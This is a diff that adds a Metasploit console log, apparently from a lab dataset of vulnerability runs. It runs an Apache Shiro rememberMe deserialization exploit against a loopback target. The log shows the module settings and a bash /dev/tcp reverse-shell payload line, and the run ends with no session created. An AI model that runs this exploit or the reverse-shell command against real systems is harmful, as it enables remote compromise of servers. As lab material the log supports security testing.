@@ -1,0 +1,34 @@
+[*] Spooling to file /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/shiro_4437/scan3.stdout...
+resource (raw/metasploit/shiro_4437/run3.rc)> use exploit/multi/http/shiro_rememberme_v124_deserialize
+[*] Using configured payload cmd/unix/reverse_bash
+resource (raw/metasploit/shiro_4437/run3.rc)> set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+resource (raw/metasploit/shiro_4437/run3.rc)> set RPORT 18032
+RPORT => 18032
+resource (raw/metasploit/shiro_4437/run3.rc)> set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+resource (raw/metasploit/shiro_4437/run3.rc)> set LPORT 4452
+LPORT => 4452
+resource (raw/metasploit/shiro_4437/run3.rc)> set TARGETURI /
+TARGETURI => /
+resource (raw/metasploit/shiro_4437/run3.rc)> set SSL false
+SSL => false
+resource (raw/metasploit/shiro_4437/run3.rc)> set VERBOSE true
+VERBOSE => true
+resource (raw/metasploit/shiro_4437/run3.rc)> check
+[-] This module does not support check.
+resource (raw/metasploit/shiro_4437/run3.rc)> run -j
+[+] bash -c '0<&152-;exec 152<>/dev/tcp/127.0.0.1/4452;sh <&152 >&152 2>&152'
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+resource (raw/metasploit/shiro_4437/run3.rc)> sleep 20
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4452 
+resource (raw/metasploit/shiro_4437/run3.rc)> sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (raw/metasploit/shiro_4437/run3.rc)> spool off
